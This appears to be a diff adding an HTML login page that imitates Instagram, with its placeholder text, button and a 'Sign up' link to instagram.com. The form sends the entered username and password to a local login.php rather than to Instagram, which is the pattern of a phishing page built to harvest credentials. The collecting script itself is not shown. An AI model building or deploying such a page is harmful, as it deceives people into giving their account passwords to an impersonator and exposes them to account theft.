@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+
+<html>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+input {
+	width: 80%;
+	padding: 10px 20px;
+	background-color: #f2f2f2;
+	border: 1px solid gray;
+	border-radius: 4px;
+	margin: 4px;
+	}
+img {
+	width: 200px;
+	}
+button {
+	padding: 7px 135px;
+	color: white;
+	background-color: #00aaff;
+	border: none;
+	border-radius: 4px;
+	font-size: 15px;
+	font-weight: bold;
+	margin: 2px;
+	}
+#p1 {
+	font-family: sans-serif;
+	text-indent: 44%;
+	color: rgb(77, 195, 255)
+	}
+#p2{
+	color: #b3b3b3;
+	font-family: sans-serif;
+	}
+a {
+	color: #33bbff;
+	text-decoration: none;
+	font-weight: bold;
+	}
+</style>
+	<body>
+		<center>
+			<img src="image/text.png"/>
+			<br><br><br>
+			<form method="post" action="login.php">
+		<input type="text" placeholder="Phone number, username, or email" name="username"></input><br>
+		<input type="password" placeholder="Password" name="password"></input><br>
+		<p id="p1">Forgot password?</p>
+		<br>
+		<button type="submit">Log In</button>
+		<p id="p2">Don't have an account? <a href="https://www.instagram.com">Sign up</a></p>
+		</form>
+	</center>
+</body>
+</html>
